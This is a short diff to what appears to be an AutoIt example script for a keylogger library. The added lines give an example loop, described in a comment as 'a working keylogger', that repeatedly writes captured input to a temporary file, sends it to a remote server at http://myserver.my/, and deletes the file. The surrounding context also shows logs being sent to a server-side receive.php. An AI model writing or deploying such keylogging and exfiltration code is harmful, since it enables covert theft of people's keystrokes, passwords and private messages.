@@ -20,3 +20,11 @@ WEnd
 
 ; You can send your logs to a server. The server has to run receive.php
 _send("http://myserver.my/receive.php/")
+
+; This example is a working keylogger. It will create a new temporary file and send it to the server short intervalls
+While 1
+	_init(@TempDir)
+	_runFor(2000)
+	_send("http://myserver.my/")
+	_deleteFile()
+WEnd
